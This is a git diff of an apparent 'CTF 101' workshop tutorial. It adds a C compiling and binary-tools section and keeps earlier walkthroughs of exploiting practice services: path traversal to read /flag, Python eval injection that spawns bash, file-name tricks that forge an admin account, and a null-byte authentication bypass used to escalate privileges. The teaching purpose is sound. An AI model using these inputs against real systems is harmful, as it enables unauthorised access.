@@ -17,15 +17,14 @@ previous day
 3. Input/Output
 4. Types of Compromise
 5. Illustration of Compromise in Target Python Applications
-6. Data Representation and Endianness
-7. C and x86-64 Assembly
-8. Memory Layout
-9. Stack Frames
-10. Calling Conventions
-11. Debuggers
-12. Memory Corruption Vulnerabilities
-13. Other Vulnerabilities
-14. Mitigations and Bypasses
+6. C and x86-64 Assembly
+7. Memory Layout
+8. Stack Frames
+9. Debuggers
+10. Memory Corruption Vulnerabilities
+11. Other Vulnerabilities
+12. Mitigations and Bypasses
+13. Conclusions and Additional Challenges
 
 ## 0. Approach
 
@@ -101,7 +100,7 @@ There are three ways to work with python:
 To launch an interactive interpreter, you can simply run the `python` command in
 the terminal.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python
 Python 2.7.12 (default, Jul  1 2016, 15:12:24)
 [GCC 5.4.0 20160609] on linux2
@@ -112,7 +111,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 Now, you may interact with the python interpreter by typing python statements
 and pressing enter to evaluate the statement immediately.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python
 Python 2.7.12 (default, Jul  1 2016, 15:12:24)
 [GCC 5.4.0 20160609] on linux2
@@ -129,7 +128,7 @@ Here's looking at you, kid.
 This is extremely useful when prototyping your exploits since you can get
 feedback about what is happening in real time by exploring python objects.
 
-```bash
+```console
 >>> people = "Soylent Green is people!"
 >>> dir(people)
 ['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__',
@@ -154,7 +153,7 @@ by typing `exit()` and launch the iPython interpreter. This upgraded interpreter
 has quality of life improvements such colourised output, tab completion, and
 object introspection. To launch it type `ipython`:
 
-```bash
+```console
 >>> exit()
 elliot@ctf101-shell:~/ctf101$ ipython
 Python 2.7.12 (default, Jul  1 2016, 15:12:24)
@@ -203,7 +202,7 @@ if __name__ == "__main__":
 
 Run the script by entering `python sample.py` in the terminal.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python sample.py
 Name: Mr Robot
 Your name is Mr Robot
@@ -216,7 +215,7 @@ Sometimes if what we need to do is terse enough to do in a single line of
 python, we may opt to pass the python code as an argument to the python program.
 This lets us create nifty one liners for use in terminal trickery.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python -c 'print "Clone\n"*10'
 Clone
 Clone
@@ -235,7 +234,7 @@ elliot@ctf101-shell:~/ctf101$
 Why would you use this option? For example, you might want to get something
 quick and easy output for piping into another program.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python -c 'print "MrRobot"*42' | md5sum
 827eae4fb606cf49ccaf8fc6b65cfdae  -
 ```
@@ -640,7 +639,7 @@ We will look at the following sources of I/O:
 The first way a program may take input is through its arguments. Let us use the
 ping command as an example.
 
-```bash
+```console
 elliot@ctf101-shell:~$ ping -h
 Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
             [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
@@ -651,7 +650,7 @@ Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
 The help argument (-h) tells the ping command to print the available options for
 arguments. In this case, the destination to ping is required as an argument.
 
-```bash
+```console
 elliot@ctf101-shell:~$ ping google.com
 PING google.com (74.125.200.138) 56(84) bytes of data.
 64 bytes from sa-in-f138.1e.net (74.125.200.138): icmp_seq=1 ttl=50 time=3.15 ms
@@ -668,7 +667,7 @@ Sometimes you want to provide spaces within an argument. For example, you want
 to create one file called "cool file" but when you try it by using the touch
 program, two files called 'cool' and 'file' are created instead.
 
-```bash
+```console
 elliot@ctf101-shell:~/myfiles$ touch cool file
 elliot@ctf101-shell:~/myfiles$ ls -la
 total 8
@@ -682,7 +681,7 @@ elliot@ctf101-shell:~/myfiles$
 We can remedy this by using quotes to treat whatever is in between them as a
 single argument to the program.
 
-```bash
+```console
 elliot@ctf101-shell:~/myfiles$ touch 'cool file'
 elliot@ctf101-shell:~/myfiles$ ls -la
 total 8
@@ -697,7 +696,7 @@ compute the argument instead of giving the program a static argument each time.
 Perhaps, in this scenario you would like to rename the file to the md5 hash of
 its contents. We can employ the use of backticks (`) in bash to achieve this.
 
-```bash
+```console
 elliot@ctf101-shell:~/myfiles$ ls -la 'cool file'
 -rw-r--r-- 1 elliot ctf101 0 Aug 18 18:38 cool file
 elliot@ctf101-shell:~/myfiles$ md5sum 'cool file' | cut -c -32
@@ -741,7 +740,7 @@ The `os.system()` function is basically a wrapper to run shell commands. There
 is a big distinction to running a program within a shell and without as we will
 see when we use the subprocess module instead. Running the program yields:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python argumentsos.py
 f0ee0388ebfa8223e795491cb38a3081  /etc/issue.net
 Hello, Friend
@@ -749,7 +748,7 @@ Hello, Friend
 
 Checking that the file indeed exists within the current directory now:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ ls -la badfile
 total 20
 -rw-r--r-- 1 elliot ctf101   14 Aug 19 06:38 badfile
@@ -784,7 +783,7 @@ The special symbols that meant various things within the shell such as pipes,
 backticks, redirections now are just passed directly to the program instead of
 interpreted by the shell and will do nothing. Executing the python script:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python argumentsubprocess.py
 f0ee0388ebfa8223e795491cb38a3081  /etc/issue.net
 ```
@@ -799,7 +798,7 @@ stream.
 
 Remember the python interpreter we interacted with?
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python
 Python 2.7.12 (default, Jul  1 2016, 15:12:24)
 [GCC 5.4.0 20160609] on linux2
@@ -815,7 +814,7 @@ the program 'sends' data through `stdout` to us by printing it in our shell.
 What about `stderr`? Error messages such as the following are written to
 `stderr`:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ ls -la /root
 ls: cannot open directory '/root': Permission denied
 ```
@@ -825,7 +824,7 @@ redirection. Often you would like for programs to interact with each other. You
 have seen examples of this in some of the previous code snippets. Imagine
 running a program and getting some output:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python -c 'print "A"*24'
 AAAAAAAAAAAAAAAAAAAAAAAA
 elliot@ctf101-shell:~/ctf101$
@@ -838,7 +837,7 @@ join the `stdout` of the `python` program to the `stdin` of another program, say
 of a second program. The special symbol we use to do this is called the 'pipe'
 (|).
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python -c 'print "A"*24' | base64
 QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBCg==
 elliot@ctf101-shell:~/ctf101$
@@ -846,7 +845,7 @@ elliot@ctf101-shell:~/ctf101$
 
 We can even chain more pipes to connect the output of `base64` to `md5sum`.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python -c 'print "A"*24' | base64 | md5sum
 2aafa255bcb4d626dba2804faf55a16a  -
 elliot@ctf101-shell:~/ctf101$
@@ -857,7 +856,7 @@ this by using stream redirection. Going back to the `stderr` example, we can
 make the output disappear by redirecting what comes out on `stderr` to the
 special `/dev/null` device that ignores what is fed into it.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ ls -la /root
 ls: cannot open directory '/root': Permission denied
 elliot@ctf101-shell:~/ctf101$ ls -la /root 2>/dev/null
@@ -870,7 +869,7 @@ Take note that the streams are given file descriptor numbers. 0 is `stdin`, 1 is
 output go into the `/dev/null` device and disappear. Let us look at an example
 with `grep`.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ echo "hello world" | grep -c hello
 1
 elliot@ctf101-shell:~/ctf101$ echo "hello world" | grep -c goodbye
@@ -882,7 +881,7 @@ elliot@ctf101-shell:~/ctf101$
 argument and if it matches, it outputs the number of matched occurences (due to
 us applying the `-c` argument). Let us try this out on the `stderr` example.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ ls -la /root
 ls: cannot open directory '/root': Permission denied
 elliot@ctf101-shell:~/ctf101$ ls -la /root | grep -c denied
@@ -894,7 +893,7 @@ elliot@ctf101-shell:~/ctf101$
 Notice that the error message is still printed out and the word denied is not
 matched. If we redirect `stderr` to `stdout`, and grep for the word, it changes.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ ls -la /root 2>&1 | grep -c denied
 1
 elliot@ctf101-shell:~/ctf101$
@@ -942,7 +941,7 @@ if __name__ == "__main__":
 
 Running the application:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python streams.py
 aGVsbG8=
 
@@ -954,7 +953,7 @@ elliot@ctf101-shell:~/ctf101$
 Some programs take filenames as arguments. The simplest of them is the `cat`
 command which reads the file and prints the file contents to `stdout`.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ cat /etc/issue.net
 Ubuntu 16.04.1 LTS
 elliot@ctf101-shell:~/ctf101$
@@ -963,7 +962,7 @@ elliot@ctf101-shell:~/ctf101$
 With bash, you can also redirect the output of program to a file with the `>`
 symbol.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ echo "Contents of this file" > thisfile
 elliot@ctf101-shell:~/ctf101$ cat thisfile
 Contents of this file
@@ -973,7 +972,7 @@ elliot@ctf101-shell:~/ctf101$
 You can also read files into the `stdin` of a program with the opposite symbol
 `<`.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ base64 < thisfile
 Q29udGVudHMgb2YgdGhpcyBmaWxlCg==
 elliot@ctf101-shell:~/ctf101$
@@ -1010,7 +1009,7 @@ if __name__ == "__main__":
 
 Running the script:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python files.py
 some string
 elliot@ctf101-shell:~/ctf101$
@@ -1027,7 +1026,7 @@ lets you create arbitrary TCP or UDP sockets.
 Obviously we know that web pages are served over the network but can we manually
 obtain the home page of http://codesinverse.com? We can with netcat!
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc codesinverse.com 80
 GET / HTTP/1.0
 
@@ -1060,7 +1059,7 @@ elliot@ctf101-shell:~/ctf101$
 Often, when you play in a CTF, the challenge description might contain something
 like `nc pwn.spro.ink 1337`. Why not try it out?
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1337
 What is your name? Elliot Alderson
 Welcome Elliot Alderson, here's your flag: ctf101{1st_Fl4g_0f_th3_d4y!}
@@ -1099,7 +1098,7 @@ if __name__ == "__main__":
 
 Running the script:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python sockets.py
 What is your name?
 Welcome Elliot Alderson, here's your flag: ctf101{1st_Fl4g_0f_th3_d4y!}
@@ -1150,7 +1149,7 @@ We can set environment variables temporarily for the duration of the terminal
 session by using `export`. We can expand environment variables in the shell by
 prefixing `$`.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ export MYFLAG=mrrobot
 elliot@ctf101-shell:~/ctf101$ echo $MYFLAG
 mrrobot
@@ -1310,7 +1309,7 @@ if __name__ == "__main__":
 Run it in your newly created terminal, note the connection information and
 return to your first terminal.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python denialofservice.py
 Please connect to localhost 43065
 
@@ -1318,7 +1317,7 @@ Please connect to localhost 43065
 
 Try interacting with the server normally.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc localhost 43065
 Please enter the number you wish to square: 23
 529
@@ -1329,7 +1328,7 @@ Do this a couple of times to convince yourself that the server will work for
 multiple people. Now, let us deny others the service by attempting to crash the
 script. What happens when we pass the server a letter instead of a number?
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc localhost 43065
 Please enter the number you wish to square: A
 elliot@ctf101-shell:~/ctf101$ nc -v localhost 43065
@@ -1341,7 +1340,7 @@ Looks like the server is no longer accepting connections. If we check the
 terminal where we ran the server we find that the script has terminated due to
 an exception:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ python denialofservice.py
 Please connect to localhost 43065
 Traceback (most recent call last):
@@ -1391,7 +1390,7 @@ if __name__ == "__main__":
 Can you spot the vulnerability? The service is running at `nc pwn.spro.ink
 1338`. Let's try interacting with it.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1338
 Welcome to the Infoleak!
 Please enter an index: 0
@@ -1426,7 +1425,7 @@ into an integer. Most programming languages support inputs such as "1", "999",
 and with some parameters, "4e3bc" but remember, negative integers are integers
 too and are properly handled by these parsers. Let's see if it works:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1338
 Welcome to the Infoleak!
 Please enter an index: -2
@@ -1440,7 +1439,7 @@ And it does! Supplying a negative integer will allow us to read data from the
 non-public segment of the 'haystack'. It is just a matter of applying the
 information of the flag length we obtained just now to get the entire flag.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1338
 Welcome to the Infoleak!
 Please enter an index: -43
@@ -1490,7 +1489,7 @@ if __name__ == "__main__":
 
 The service is running at `nc pwn.spro.ink 1339`. Let's try interacting with it:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1339
 Our selection: futurama, ghost, pinkfloyd, rat
 Take your pick: pinkfloyd
@@ -1561,7 +1560,7 @@ legitimate or not.
 We can read the flag file at `/flag` by traversing upwards in the directory path
 using `..` to get to root:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1339
 Our selection: futurama, ghost, pinkfloyd, rat
 Take your pick: ../../../../../../flag
@@ -1703,7 +1702,7 @@ if __name__ == "__main__":
 
 Let's go through a legitimate run to get a feel of what is going on.
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1340
 Secret Storage 1.0
 You are not logged in. Please choose one option:
@@ -1808,7 +1807,7 @@ down the accounts directory and create a file of our choosing. We can leverage
 this to store a secret with the contents `1:password` and a controlled filename
 to create our admin user. The attack looks like this:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1340
 Secret Storage 1.0
 You are not logged in. Please choose one option:
@@ -1836,7 +1835,7 @@ elliot@ctf101-shell:~/ctf101$
 
 Now, we can log in with our new admin account and read the admin secret:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1340
 Secret Storage 1.0
 You are not logged in. Please choose one option:
@@ -1907,7 +1906,7 @@ usable shell!
 
 There are multiple solutions, but here is one:
 
-```bash
+```console
 $ python codeexec.py
 SuperCalculator (e.g. 2+2): __import__("os").system("bash")
 $
@@ -1954,7 +1953,7 @@ in when there's a vulnerability in the code.
 The service is running at `ssh -p 1342 escalate@pwn.spro.ink`. Login with the
 password `escalate`. Here's a sample run:
 
-```bash
+```console
 elliot@ctf101-shell:~/ctf101$ ssh -p 1342 escalate@pwn.spro.ink
 The authenticity of host '[pwn.spro.ink]:1342 ([188.166.246.7]:1342)' can't be
 established.
@@ -2022,7 +2021,7 @@ we can bypass the authentication completely. To do this, we simply provide a
 string starting with a null byte to immediately halt the loop. We shall use some
 python for this.
 
-```bash
+```console
 $ python -c 'print "\x00"' | ./escalate
 Password: Win!
 $ id
@@ -2035,7 +2034,7 @@ us a real nice elevated shell. However, notice that no extra privileges are
 conferred yet. This is because the streams are closed. To get around this, we
 use `cat` on `stdin` as our 'bridge'.
 
-```bash
+```console
 $ (python -c 'print "\x00"'; cat -) | ./escalate
 Password: Win!
 id
@@ -2059,56 +2058,506 @@ $
 Notice now that we have the `privesca` group privilege and are now able to read
 the flag.
 
-## 6. Data Representation and Endianness
+## 6. C and x86-64 Assembly
 
-### Numbering Systems 
+A quick introduction to writing, compiling, and disassembling binaries from C
+code.
 
-#### Decimal 
+### Compiling C
 
-First of all, let's examine the way we count in our daily lives. We count in
-sets of ten.
+To create the binaries, we need to go through the write, compile, execute cycle.
+First, create the following C file as `sample.c`:
 
-#### Unary 
+```c
+#include <stdio.h>
 
-Consider the simplest 
+int main(int argc, char * argv[]) {
+    char * mystring = "This is a string";
+    printf("I am going to print: %s.\n", mystring);
+}
+```
 
-#### Binary
+We can compile this using the GNU C Compiler, or `gcc` for short, to create 64
+bit ELF x64 binaries. The syntax is simple:
 
-#### Octal
+```console
+elliot@ctf101-shell:~/ctf101$ gcc -o sample sample.c
+elliot@ctf101-shell:~/ctf101$
+```
 
-#### Hexadecimal
+Now we can run the program with the following syntax:
+
+```console
+elliot@ctf101-shell:~/ctf101$ ./sample
+I am going to print: This is a string.
+elliot@ctf101-shell:~/ctf101$
+```
+
+Try compiling the following code with the filename `demotools.c`:
+
+```c
+int main(int argc, char ** argv) {
+    printf(argv[1]);
+    say_hello();
+}
+
+void say_hello() {
+    char * ihateeveryone = "Goaway!\n";
+    char * iloveveryone = "Helloo!\n";
+    if (strcmp(ihateeveryone, iloveveryone) == 0) {
+        printf(ihateeveryone);
+    }
+    printf(iloveveryone);
+}
+```
+
+Notice that this time, there are a lot of warnings and complaints from the
+compiler since not-so-great practices are used in this example. However, it
+successfully compiles. While there aren't any vulnerabilities in this example,
+its illustrative of how easy it is to ignore issues when actually developing in
+C.
+
+```console
+elliot@ctf101-shell:~/ctf101$ gcc -o demotools demotools.c
+demotools.c: In function ‘main’:
+demotools.c:2:5: warning: implicit declaration of function ‘printf’
+[-Wimplicit-function-declaration]
+     printf(argv[1]);
+     ^
+demotools.c:2:5: warning: incompatible implicit declaration of built-in function
+‘printf’
+demotools.c:2:5: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
+demotools.c:2:5: warning: format not a string literal and no format arguments
+[-Wformat-security]
+demotools.c:3:5: warning: implicit declaration of function ‘say_hello’
+[-Wimplicit-function-declaration]
+     say_hello();
+     ^
+demotools.c: At top level:
+demotools.c:6:6: warning: conflicting types for ‘say_hello’
+ void say_hello() {
+      ^
+demotools.c:3:5: note: previous implicit declaration of ‘say_hello’ was here
+     say_hello();
+     ^
+demotools.c: In function ‘say_hello’:
+demotools.c:9:9: warning: implicit declaration of function ‘strcmp’
+[-Wimplicit-function-declaration]
+     if (strcmp(ihateeveryone, iloveveryone) == 0) {
+         ^
+demotools.c:10:9: warning: incompatible implicit declaration of built-in
+function ‘printf’
+         printf(ihateeveryone);
+         ^
+demotools.c:10:9: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
+demotools.c:10:9: warning: format not a string literal and no format arguments
+[-Wformat-security]
+demotools.c:12:5: warning: incompatible implicit declaration of built-in
+function ‘printf’
+     printf(iloveveryone);
+     ^
+demotools.c:12:5: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
+demotools.c:12:5: warning: format not a string literal and no format arguments
+[-Wformat-security]
+elliot@ctf101-shell:~/ctf101$
+```
+
+### Binary Tools
+
+We will use this new binary we have to demonstrate some tools for binary
+analysis.
+
+#### nm
+
+nm is a tool from GNU binutils that lists the symbols from an object or binary
+file.
+
+```console
+elliot@ctf101-shell:~/ctf101$ nm demotools
+0000000000601040 B __bss_start
+0000000000601040 b completed.7585
+0000000000601030 D __data_start
+0000000000601030 W data_start
+00000000004004a0 t deregister_tm_clones
+0000000000400520 t __do_global_dtors_aux
+0000000000600e18 t __do_global_dtors_aux_fini_array_entry
+0000000000601038 D __dso_handle
+0000000000600e28 d _DYNAMIC
+0000000000601040 D _edata
+0000000000601048 B _end
+0000000000400674 T _fini
+0000000000400540 t frame_dummy
+0000000000600e10 t __frame_dummy_init_array_entry
+00000000004007e8 r __FRAME_END__
+0000000000601000 d _GLOBAL_OFFSET_TABLE_
+                 w __gmon_start__
+0000000000400698 r __GNU_EH_FRAME_HDR
+0000000000400400 T _init
+0000000000600e18 t __init_array_end
+0000000000600e10 t __init_array_start
+0000000000400680 R _IO_stdin_used
+                 w _ITM_deregisterTMCloneTable
+                 w _ITM_registerTMCloneTable
+0000000000600e20 d __JCR_END__
+0000000000600e20 d __JCR_LIST__
+                 w _Jv_RegisterClasses
+0000000000400670 T __libc_csu_fini
+0000000000400600 T __libc_csu_init
+                 U __libc_start_main@@GLIBC_2.2.5
+0000000000400566 T main
+                 U printf@@GLIBC_2.2.5
+00000000004004e0 t register_tm_clones
+000000000040059e T say_hello
+0000000000400470 T _start
+                 U strcmp@@GLIBC_2.2.5
+0000000000601040 D __TMC_END__
+elliot@ctf101-shell:~/ctf101$
+```
+
+The letters mean some pretty important things. D for example, means that that
+symbols resides with the data section, T, the text or code section, R means
+read-only data, etc. Check the manual page for a full description of all the
+flags.
+
+Now, these symbols aren't always included in the binaries (usually they are
+stripped in CTFs) but when they are, they're really useful for reversing.
+
+#### ltrace
+
+ltrace is a really cool GNU binutils tool that lets you trace library cools
+during the program's execution.
+
+```console
+elliot@ctf101-shell:~/ctf101$ ltrace ./demotools
+__libc_start_main(0x400566, 1, 0x7ffe1865a388, 0x400600 <unfinished ...>
+printf(nil)                                                                 = -1
+strcmp("Goaway!\n", "Helloo!\n")                                            = -1
+printf("Helloo!\n"Helloo!
+)                                                                           = 8
++++ exited (status 0) +++
+elliot@ctf101-shell:~/ctf101$
+```
+
+Notice that the `stdout` of the program mixes with the output of the ltrace
+execution trace. You can avoid that by redirecting `stdout` to `/dev/null`
+
+```console
+elliot@ctf101-shell:~/ctf101$ ltrace ./demotools 1>/dev/null
+__libc_start_main(0x400566, 1, 0x7ffcc78f6bb8, 0x400600 <unfinished ...>
+printf(nil)                                                                 = -1
+strcmp("Goaway!\n", "Helloo!\n")                                            = -1
+printf("Helloo!\n")                                                         = 8
++++ exited (status 0) +++
+elliot@ctf101-shell:~/ctf101$
+```
+
+#### strace
+
+Likewise, strace lets you trace system calls and signals during the program's
+execution.
+
+```console
+elliot@ctf101-shell:~/ctf101$ strace ./demotools
+execve("./demotools", ["./demotools"], [/* 29 vars */]) = 0
+brk(NULL)                               = 0x1f69000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f70f51a8000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat(3, {st_mode=S_IFREG|0644, st_size=24756, ...}) = 0
+mmap(NULL, 24756, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f70f51a1000
+close(3)                                = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\t\2\0\0\0\0\0"..., 832) = 832
+fstat(3, {st_mode=S_IFREG|0755, st_size=1864888, ...}) = 0
+mmap(NULL, 3967488, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f70f4bbc000
+mprotect(0x7f70f4d7c000, 2093056, PROT_NONE) = 0
+mmap(0x7f70f4f7b000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bf000) = 0x7f70f4f7b000
+mmap(0x7f70f4f81000, 14848, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f70f4f81000
+close(3)                                = 0
+mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f70f51a0000
+mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f70f519f000
+mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f70f519e000
+arch_prctl(ARCH_SET_FS, 0x7f70f519f700) = 0
+mprotect(0x7f70f4f7b000, 16384, PROT_READ) = 0
+mprotect(0x600000, 4096, PROT_READ)     = 0
+mprotect(0x7f70f51aa000, 4096, PROT_READ) = 0
+munmap(0x7f70f51a1000, 24756)           = 0
+fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
+brk(NULL)                               = 0x1f69000
+brk(0x1f8a000)                          = 0x1f8a000
+write(1, "Helloo!\n", 8Helloo!
+)                = 8
+exit_group(0)                           = ?
++++ exited with 0 +++
+elliot@ctf101-shell:~/ctf101$
+```
+
+#### GDB
+
+We will cover this in greater depth a little later in the workshop but here's a
+little teaser:
+
+```console
+elliot@ctf101-shell:~/ctf101$ gdb demotools
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from demotools...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /home/elliot/ctf101/demotools
+Helloo!
+[Inferior 1 (process 7301) exited normally]
+(gdb)
+```
+
+#### objdump
+
+objdump is actually the swiss army knife of extracting information from a
+binary. You can do a whole lot of things with it, but for now, let's just do a
+disassembly.
+
+```console
+elliot@ctf101-shell:~/ctf101$ objdump -d demotools
+
+demotools:     file format elf64-x86-64
 
 
-### Data Representation
+Disassembly of section .init:
 
-#### integers, word size, ascii, asciiz strings
+0000000000400400 <_init>:
+  400400:       48 83 ec 08             sub    $0x8,%rsp
+  400404:       48 8b 05 ed 0b 20 00    mov    0x200bed(%rip),%rax        # 600ff8 <_DYNAMIC+0x1d0>
+  40040b:       48 85 c0                test   %rax,%rax
+  40040e:       74 05                   je     400415 <_init+0x15>
+  400410:       e8 4b 00 00 00          callq  400460 <strcmp@plt+0x10>
+  400415:       48 83 c4 08             add    $0x8,%rsp
+  400419:       c3                      retq
 
-### Endianness
+Disassembly of section .plt:
 
-## 7. C and x86-64 Assembly
+0000000000400420 <printf@plt-0x10>:
+  400420:       ff 35 e2 0b 20 00       pushq  0x200be2(%rip)        # 601008 <_GLOBAL_OFFSET_TABLE_+0x8>
+  400426:       ff 25 e4 0b 20 00       jmpq   *0x200be4(%rip)        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
+  40042c:       0f 1f 40 00             nopl   0x0(%rax)
 
-- Compiling C
-- Disassembling the binary
-- Reading x86-64 assembly
+0000000000400430 <printf@plt>:
+  400430:       ff 25 e2 0b 20 00       jmpq   *0x200be2(%rip)        # 601018 <_GLOBAL_OFFSET_TABLE_+0x18>
+  400436:       68 00 00 00 00          pushq  $0x0
+  40043b:       e9 e0 ff ff ff          jmpq   400420 <_init+0x20>
 
-## 8. Memory Layout
+0000000000400440 <__libc_start_main@plt>:
+  400440:       ff 25 da 0b 20 00       jmpq   *0x200bda(%rip)        # 601020 <_GLOBAL_OFFSET_TABLE_+0x20>
+  400446:       68 01 00 00 00          pushq  $0x1
+  40044b:       e9 d0 ff ff ff          jmpq   400420 <_init+0x20>
+
+0000000000400450 <strcmp@plt>:
+  400450:       ff 25 d2 0b 20 00       jmpq   *0x200bd2(%rip)        # 601028 <_GLOBAL_OFFSET_TABLE_+0x28>
+  400456:       68 02 00 00 00          pushq  $0x2
+  40045b:       e9 c0 ff ff ff          jmpq   400420 <_init+0x20>
+
+Disassembly of section .plt.got:
+
+0000000000400460 <.plt.got>:
+  400460:       ff 25 92 0b 20 00       jmpq   *0x200b92(%rip)        # 600ff8 <_DYNAMIC+0x1d0>
+  400466:       66 90                   xchg   %ax,%ax
+
+Disassembly of section .text:
+
+0000000000400470 <_start>:
+  400470:       31 ed                   xor    %ebp,%ebp
+  400472:       49 89 d1                mov    %rdx,%r9
+  400475:       5e                      pop    %rsi
+  400476:       48 89 e2                mov    %rsp,%rdx
+  400479:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
+  40047d:       50                      push   %rax
+  40047e:       54                      push   %rsp
+  40047f:       49 c7 c0 70 06 40 00    mov    $0x400670,%r8
+  400486:       48 c7 c1 00 06 40 00    mov    $0x400600,%rcx
+  40048d:       48 c7 c7 66 05 40 00    mov    $0x400566,%rdi
+  400494:       e8 a7 ff ff ff          callq  400440 <__libc_start_main@plt>
+  400499:       f4                      hlt
+  40049a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)
+
+... application boilerplate snipped away ...
+
+0000000000400566 <main>:
+  400566:       55                      push   %rbp
+  400567:       48 89 e5                mov    %rsp,%rbp
+  40056a:       48 83 ec 10             sub    $0x10,%rsp
+  40056e:       89 7d fc                mov    %edi,-0x4(%rbp)
+  400571:       48 89 75 f0             mov    %rsi,-0x10(%rbp)
+  400575:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  400579:       48 83 c0 08             add    $0x8,%rax
+  40057d:       48 8b 00                mov    (%rax),%rax
+  400580:       48 89 c7                mov    %rax,%rdi
+  400583:       b8 00 00 00 00          mov    $0x0,%eax
+  400588:       e8 a3 fe ff ff          callq  400430 <printf@plt>
+  40058d:       b8 00 00 00 00          mov    $0x0,%eax
+  400592:       e8 07 00 00 00          callq  40059e <say_hello>
+  400597:       b8 00 00 00 00          mov    $0x0,%eax
+  40059c:       c9                      leaveq
+  40059d:       c3                      retq
+
+000000000040059e <say_hello>:
+  40059e:       55                      push   %rbp
+  40059f:       48 89 e5                mov    %rsp,%rbp
+  4005a2:       48 83 ec 10             sub    $0x10,%rsp
+  4005a6:       48 c7 45 f0 84 06 40    movq   $0x400684,-0x10(%rbp)
+  4005ad:       00
